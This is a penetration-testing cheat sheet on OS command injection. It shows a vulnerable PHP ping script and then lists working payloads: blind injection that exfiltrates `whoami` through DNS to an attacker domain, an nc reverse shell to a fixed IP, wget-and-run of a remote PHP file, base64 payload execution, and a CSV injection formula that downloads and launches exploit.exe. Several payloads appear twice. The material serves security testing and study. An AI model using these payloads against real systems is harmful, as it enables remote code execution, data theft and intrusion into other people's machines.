# Command Injection and Execution

>[!tip]
>It occurs when, due to incorrect input sanitization, a web app using system commands mistakenly executes malicious commands in addition to the one it was designed for.

For example:

```php
<?php
if (isset($_GET['ip'])) {
    $ip_valore = $_GET['ip'];
    $ping_result = system("ping {$ip_valore}");
    echo ($ping_result)
}
?>
```

Submitting as a payload the value `127.0.0.1 ; ifconfig` the app will execute `ping 127.0.0.1 ; ifconfig`, executing our injected code.

## Blind OS command injection

```
& ping -c 10 127.0.0.1 &
& whoami > /var/www/static/whoami.txt &
& nslookup kgji2ohoyw.web-attacker.com &
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

## Concatenation symbols

- `;` : At least one of the two commands must be valid
- `&` : At least one of the two commands must be valid
- `|` : At least one of the two commands must be valid
- `&&` : Both commands must be valid, otherwise nothing will be executed
- `||` : Both commands must be valid, otherwise nothing will be executed
- `%0a`: New line, sometimes special characters are not checked and allow the execution of other commands

### Extended list

```bash
# Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)

# Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands

# Not execute but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command

# Examples
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```

## Bypasses

>[!tip]
>Bypass bash restrictions: https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions

```bash
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```

# Command Fuzzing List

- [https://github.com/payloadbox/command-injection-payload-list](https://github.com/payloadbox/command-injection-payload-list)
- [https://github.com/PortSwigger/command-injection-attacker](https://github.com/PortSwigger/command-injection-attacker)

---
# Command Injection inside files

## Excel (CSV Injection)

Trigger the calculator app: [^csv-injection]

[^csv-injection]: [CSV Injection: How a Simple Spreadsheet Can Hack Your Computer; Ali Hussain](https://medium.com/@ghostxploiter/how-a-simple-spreadsheet-can-hack-your-computer-csv-injection-98f4a26c4957)

```
=cmd|'/C calc'!A0,
```

Execute reverse shell:

```
=cmd|' /C powershell Invoke-WebRequest "http://192.168.1.6:80/exploit.exe" -OutFile "$env:Temp\exploit.exe"; Start-Process "$env:Temp\exploit.exe"'!'A1'
```

---
# External References

- [Hunting asynchronous vulnerabilities](https://portswigger.net/research/hunting-asynchronous-vulnerabilities)
